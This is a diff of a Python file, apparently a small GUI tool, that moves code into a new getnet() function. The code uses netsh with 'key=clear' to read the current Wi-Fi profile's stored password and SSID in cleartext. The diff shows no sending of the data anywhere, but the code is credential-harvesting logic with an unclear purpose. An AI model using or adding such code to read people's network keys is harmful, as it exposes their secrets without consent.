@@ -55,7 +55,25 @@ file_name = ""
 file_name_path = "/"
 
 
+def getnet():
+   resultss = subprocess.run(['netsh', 'wlan', 'show', 'interface', 'key=clear'], stdout=subprocess.PIPE)
+   outputsads = resultss.stdout.decode()
 
+
+   for line in outputsads.split('\r\n'):
+         if "Profile" in line:
+            
+            passwordss = line.split(":")[1].strip()
+    
+   
+   result = subprocess.run(['netsh', 'wlan', 'show', 'profile', passwordss, 'key=clear'], stdout=subprocess.PIPE)
+   output = result.stdout.decode()
+   
+   for line in output.split('\n'):
+      if "Key Content" in line:
+        password = line.split(":")[1].strip()
+      elif "Name" in line:
+        ssid = line.split(":")[1].strip()
 def log():
     
     slidevalue = slider.get()
@@ -66,24 +84,7 @@ def log():
    
 
 
-    resultss = subprocess.run(['netsh', 'wlan', 'show', 'interface', 'key=clear'], stdout=subprocess.PIPE)
-    outputsads = resultss.stdout.decode()
-
-
-    for line in outputsads.split('\r\n'):
-         if "Profile" in line:
     
-            passwordss = line.split(":")[1].strip()
-    
-   
-    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', passwordss, 'key=clear'], stdout=subprocess.PIPE)
-    output = result.stdout.decode()
-   
-    for line in output.split('\n'):
-       if "Key Content" in line:
-        password = line.split(":")[1].strip()
-       elif "Name" in line:
-        ssid = line.split(":")[1].strip()
 
 
 
